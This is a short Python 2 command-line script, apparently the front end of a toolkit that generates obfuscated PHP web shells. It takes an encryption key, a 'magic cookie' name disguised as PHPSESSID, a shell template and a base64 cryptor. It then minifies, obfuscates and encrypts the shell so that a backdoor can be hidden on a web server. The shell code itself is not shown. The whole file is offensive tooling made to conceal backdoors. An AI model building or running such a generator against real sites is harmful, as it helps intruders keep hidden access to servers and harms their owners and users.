#!/usr/bin/env python

from shell.generate import generate_shell, generate_cryptor
from shell.generate import minify, remove_tags_php
from shell.generate import list_shells, list_cryptors
from shell.generate import key
from shell.obfuscate import Obfuscator

import sys
import argparse

def parse_args():
	parser = argparse.ArgumentParser(description='generate shells')
	parser.add_argument('--key', metavar='1337', dest='key',
						type=str, help='encryption key', default='1337' )
	parser.add_argument('--action', metavar='PHPSESSID', dest='action',
						type=str, help='magic cookie', default='PHPSESSID' )
	parser.add_argument('--shell', metavar='shell.php', dest='shell',
						type=str, help='shell', default='shell.php' )
	parser.add_argument('--cryptor', metavar='b64.php', dest='cryptor',
						type=str, help='cryptor', default='b64.php' )
	parser.add_argument('--list', action='store_true', dest='list',
						help='list resources' )
	args = parser.parse_args()
	return args

def obfuscated( file, cryptor, key, action='PHPSESSID' ):
	shellcode = remove_tags_php( minify( generate_shell(file=file,
														key=key,
														action=action) ))
	return generate_cryptor(file=cryptor,
							obfuscate=Obfuscator(shellcode=shellcode))

if __name__ == "__main__":
	args = parse_args()
	if args.list:
		for shell in list_shells():
			print ' [*] {} [shell]'.format( shell )
		for cryptor in list_cryptors():
			print ' [*] {} [cryptor]'.format( cryptor )
		sys.exit()
	print obfuscated( file=args.shell,
						cryptor=args.cryptor,
						key=args.key,
						action=args.action )
